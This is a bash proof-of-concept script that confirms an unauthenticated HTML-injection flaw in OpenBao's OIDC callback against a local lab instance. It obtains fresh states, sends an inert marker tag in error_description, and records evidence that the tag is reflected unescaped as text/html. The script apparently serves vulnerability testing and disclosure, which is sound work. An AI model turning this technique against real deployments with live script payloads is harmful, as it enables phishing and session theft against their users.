#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://127.0.0.1:8200"
AUTH_PATH="oidc"
ROLE="lab-direct"
REDIRECT_URI="http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback"
MARKER='<b data-poc="oidc-marker">OIDC_MARKER</b>'

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
EVIDENCE_DIR="$SCRIPT_DIR/../evidence"
mkdir -p "$EVIDENCE_DIR"
RUN_DIR=$(mktemp -d "$EVIDENCE_DIR/run.XXXXXX")

fail() {
  printf 'FAIL: %s\n' "$*" >&2
  printf 'Evidence: %s\n' "$RUN_DIR" >&2
  exit 1
}

command -v curl >/dev/null 2>&1 || fail "curl is required"
command -v jq >/dev/null 2>&1 || fail "jq is required"

printf 'OpenBao OIDC direct-callback HTML injection PoC\n' >"$RUN_DIR/summary.txt"
printf 'base_url=%s\n' "$BASE_URL" >>"$RUN_DIR/summary.txt"

get_state() {
  local nonce="$1"
  local label="$2"
  local body="$RUN_DIR/${label}-auth-url.body"
  local headers="$RUN_DIR/${label}-auth-url.headers"
  local status

  if ! status=$(curl --silent --show-error --max-time 10 \
      -X POST "$BASE_URL/v1/auth/$AUTH_PATH/oidc/auth_url" \
      -H 'Content-Type: application/json' \
      --trace-ascii "$RUN_DIR/${label}-auth-url.trace" \
      -D "$headers" -o "$body" -w '%{http_code}' \
      --data "{\"role\":\"$ROLE\",\"redirect_uri\":\"$REDIRECT_URI\",\"client_nonce\":\"$nonce\"}"); then
    fail "auth_url request failed for $label"
  fi
  [ "$status" = 200 ] || fail "auth_url returned HTTP $status for $label"

  jq -er '.data.state | strings | select(length > 0)' "$body" ||
    fail "auth_url did not return a pending state for $label"
}

bad_state=$(get_state 'poc-malicious-state' malicious)
good_state=$(get_state 'poc-benign-state' benign)

cat >"$RUN_DIR/requests.txt" <<EOF
POST /v1/auth/$AUTH_PATH/oidc/auth_url
Content-Type: application/json

{"role":"$ROLE","redirect_uri":"$REDIRECT_URI","client_nonce":"poc-malicious-state"}

GET /v1/auth/$AUTH_PATH/oidc/callback?state=$bad_state&error_description=%3Cb%20data-poc%3D%22oidc-marker%22%3EOIDC_MARKER%3C%2Fb%3E

POST /v1/auth/$AUTH_PATH/oidc/auth_url
Content-Type: application/json

{"role":"$ROLE","redirect_uri":"$REDIRECT_URI","client_nonce":"poc-benign-state"}

GET /v1/auth/$AUTH_PATH/oidc/callback?state=$good_state&error_description=plain-control
EOF

request_callback() {
  local state="$1"
  local description="$2"
  local label="$3"
  local headers="$RUN_DIR/${label}-callback.headers"
  local body="$RUN_DIR/${label}-callback.body"
  local status

  if ! status=$(curl --silent --show-error --max-time 10 \
      --get "$BASE_URL/v1/auth/$AUTH_PATH/oidc/callback" \
      --data-urlencode "state=$state" \
      --data-urlencode "error_description=$description" \
      --trace-ascii "$RUN_DIR/${label}-callback.trace" \
      -D "$headers" -o "$body" -w '%{http_code}'); then
    fail "callback request failed for $label"
  fi
  printf '%s\n' "$status" >"$RUN_DIR/${label}-callback.status"
}

request_callback "$bad_state" "$MARKER" malicious
request_callback "$good_state" 'plain-control' benign

bad_status=$(<"$RUN_DIR/malicious-callback.status")
good_status=$(<"$RUN_DIR/benign-callback.status")
bad_headers="$RUN_DIR/malicious-callback.headers"
bad_body="$RUN_DIR/malicious-callback.body"
good_body="$RUN_DIR/benign-callback.body"

[ "$bad_status" = 400 ] || fail "malicious callback returned HTTP $bad_status, expected 400"
[ "$good_status" = 400 ] || fail "benign callback returned HTTP $good_status, expected 400"
grep -Eiq '^Content-Type:[[:space:]]*text/html([;[:space:]]|$)' "$bad_headers" ||
  fail "malicious callback was not returned as text/html"
grep -Fq "$MARKER" "$bad_body" ||
  fail "unescaped HTML marker was not reflected"
grep -Fq 'plain-control' "$good_body" ||
  fail "benign control was not reflected"

if grep -Fq '&lt;b data-poc=' "$bad_body"; then
  fail "marker was HTML-escaped instead of reflected as markup"
fi

printf 'PASS: fresh unauthenticated OIDC state reaches a text/html callback that reflects attacker HTML unescaped.\n' |
  tee -a "$RUN_DIR/summary.txt"
printf 'Malicious response: %s\nBenign response: %s\n' "$bad_body" "$good_body" |
  tee -a "$RUN_DIR/summary.txt"
